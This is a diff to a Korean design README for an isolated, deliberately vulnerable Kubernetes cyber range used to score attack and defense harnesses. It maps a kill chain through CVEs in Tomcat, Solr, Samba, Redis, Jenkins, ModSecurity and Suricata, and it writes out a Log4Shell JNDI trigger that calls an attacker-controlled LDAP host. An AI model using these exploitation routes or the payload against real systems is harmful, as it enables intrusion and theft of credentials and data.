@@ -11,41 +11,54 @@
 | 존 | 네임스페이스 | 구성 | 단계 |
 |----|--------------|------|------|
 | 외부 | `corp-ext` | 공격자 발판만 | — |
-| DMZ | `corp-dmz` | Tomcat, Solr(Log4j) | 3 ✓ |
+| DMZ | `corp-dmz` | WAF, Tomcat, Solr(Log4j) + IDS 사이드카 | 3·4 ✓ |
 | 내부 | `corp-internal` | Samba, Redis, Jenkins | 2 ✓ |
 | 크라운 | `corp-crown` | PostgreSQL 11.2 민감 DB | 1 ✓ |
-| 방어 | `corp-defense` | IDS, Falco, 서비스 로그 | 4b·5 |
+| 방어 | `corp-defense` | Falco · 서비스 로그 수집 | 5 |
 
 ## 단계적 구현
 
 1. **크라운(PostgreSQL)** ✓ — 공격 → 채점 1바퀴 검증.
 2. **내부 존(Samba·Redis·Jenkins)** ✓ — 측면이동·자격증명 수집.
 3. **DMZ(Tomcat·Solr/Log4j)** ✓ — 외부노출 웹.
-4. 방어장비·격리:
-   - **4a. 존 격리(NetworkPolicy default-deny)** ✓ ← 이 커밋.
-   - 4b. 방어장비(WAF ModSecurity · IDS Suricata) — 예정(VulHub에 없어 직접 이미지).
+4. **방어장비·격리** ✓
+   - 4a. 존 격리(NetworkPolicy default-deny) ✓
+   - 4b. 방어장비(WAF ModSecurity · IDS Suricata) ✓ ← 이 커밋.
 5. 방어 2층 배선 (Falco·서비스 로그 → 방어 하네스 VM D).
 
 ## 킬체인 (발판 → 크라운)
 
-1. **발판**(`corp-ext`) → WAF(4b) → **DMZ 원격코드실행** [통과 ①]
+1. **발판**(`corp-ext`) → **WAF(유일 진입점)** → **DMZ 원격코드실행** [통과 ①]
    - Tomcat: PUT 웹셸(CVE-2017-12615) 또는 Ghostcat AJP(CVE-2020-1938)
    - Solr: Log4Shell `${jndi:ldap://<발판>/x}`(CVE-2021-44228)
+   - WAF 우회(CVE-2021-35368) 또는 DoS(CVE-2021-42717)가 전리품
 2. DMZ → **내부 측면이동**: Samba·Redis·Jenkins 장악 + 자격증명 수집 [통과 ②]
 3. Jenkins의 `corp-db.properties` → **크라운** PostgreSQL 접속 → 민감 데이터 read [크라운]
 
+## 방어장비 (4b, 환경 고정)
+
+- **WAF** = `owasp/modsecurity-crs:3.3.0-nginx` — `corp-dmz` 앞 리버스프록시(ModSecurity 3.0.5 + CRS 3.3.0).
+  외부는 WAF만 받고, Tomcat·Solr는 WAF에서만 받는다(NetworkPolicy로 강제) → **유일 진입점**.
+- **IDS** = `jasonish/suricata:4.0.3` — WAF 파드 **사이드카**로 같은 netns의 진입 트래픽을 본다(②-가).
+  내부 측면이동의 셸·프로세스는 Falco(5단계)가 본다.
+- **방어자(VM D)는 이 장비를 운용하지 않는다**(1단계). 로그만 방어 관측에 쓰고, 공격자가
+  우회·DoS로 무력화하면 그것이 전리품으로 채점된다.
+
+> **배포 시 조정 지점** — `owasp/modsecurity-crs`의 nginx 설정 반영 위치(`conf.d` vs `templates`),
+> ModSecurity 규칙 경로, Suricata 인터페이스 이름은 실제 이미지에 맞춰 한 번 확인해야 한다.
+
 ## 존 격리 (NetworkPolicy, 4a)
 
-`default-deny` ingress 후 **한 방향만** 개방 → 위 킬체인을 강제한다.
+`default-deny` ingress 후 **한 방향만** 개방:
 
 | 존 | 들어올 수 있는 곳 |
 |----|------------------|
-| `corp-dmz` | `corp-ext` 에서만 |
+| `corp-dmz` WAF | `corp-ext` 에서만 |
+| `corp-dmz` Tomcat·Solr | `corp-dmz` WAF 에서만 |
 | `corp-internal` | `corp-dmz` 에서만 |
 | `corp-crown` | `corp-internal` 에서만 |
 
-역방향·존 건너뛰기는 차단. `egress`는 열어둬 DNS·조회는 된다. k3s 기본 CNI가 집행한다.
-WAF(4b) 추가 시 `allow-from-ext` 를 **WAF 파드로만** 좁혀 WAF를 유일 진입점으로 만든다.
+역방향·건너뛰기는 차단. `egress`는 열어둬 DNS·조회는 된다. k3s 기본 CNI가 집행한다.
 
 ## 서비스별 취약 요소
 
@@ -57,16 +70,16 @@ WAF(4b) 추가 시 `allow-from-ext` 를 **WAF 파드로만** 좁혀 WAF를 유�
 | Samba | `vulhub/samba:4.6.3` | CVE-2017-7494 (SambaCry) | 쓰기 공유에 악성 .so 로드 |
 | Redis | `vulhub/redis:4.0.14` | 무인증 | MODULE LOAD / dir+dbfilename RCE |
 | Jenkins | `vulhub/jenkins:2.138` | CVE-2018-1000861 | Stapler 코드실행 + 스크립트 콘솔 |
+| WAF | `owasp/modsecurity-crs:3.3.0-nginx` | CVE-2021-35368 / 42717 | CRS 룰 우회 / 엔진 DoS |
+| IDS | `jasonish/suricata:4.0.3` | CVE-2018-6794 | TCP 스트림 탐지 회피 |
 
 > Samba는 설계서 4.5.9 → VulHub 공식 재현 이미지 **4.6.3**을 따른다(둘 다 취약).
-> 내부·DMZ 서비스는 VulHub 원본 docker-compose의 이미지·설정을 그대로 옮겼다.
 
 ## Log4Shell 콜백 — 환경이 제공하지 않는다
 
 악성 클래스를 서빙하는 LDAP·HTTP 서버는 **공격자가 제어**해야 재현이 성립한다.
-그래서 환경엔 두지 않고, 인터넷 없는 섬에서는 공격 하네스가 `corp-ext` 발판에서
-marshalsec / Java-Chains LDAP+HTTP를 띄워 섬 내부로 콜백한다.
-트리거: `GET /solr/admin/cores?action=${jndi:ldap://<발판>:1389/x}`.
+인터넷 없는 섬에서는 공격 하네스가 `corp-ext` 발판에서 marshalsec / Java-Chains LDAP+HTTP를
+띄워 섬 내부로 콜백한다. 트리거: `GET /solr/admin/cores?action=${jndi:ldap://<발판>:1389/x}`.
 
 ## 측면이동 체인 (통과 ② → 크라운)
 
@@ -89,11 +102,9 @@ kubectl -n corp-internal rollout status deploy/redis
 kubectl -n corp-internal rollout status deploy/jenkins
 kubectl -n corp-dmz      rollout status deploy/tomcat
 kubectl -n corp-dmz      rollout status deploy/solr
+kubectl -n corp-dmz      rollout status deploy/waf
 
-# 존 격리 확인: crown 은 internal 에서만 (dmz 에서 직접 접근은 막혀야 정상)
-kubectl -n corp-internal exec deploy/jenkins -- sh -c 'nc -zv postgres.corp-crown 5432'   # 열림
-kubectl -n corp-dmz      exec deploy/tomcat  -- sh -c 'nc -zv postgres.corp-crown 5432'   # 막힘
-
+# WAF 가 유일 진입점인지: 발판(ext)에서 Tomcat 직접 접근은 막히고 WAF 경유만 열려야 한다
 # 내부 → 크라운 체인 확인
 kubectl -n corp-internal exec deploy/jenkins -- cat /opt/deploy/corp-db.properties
 ```
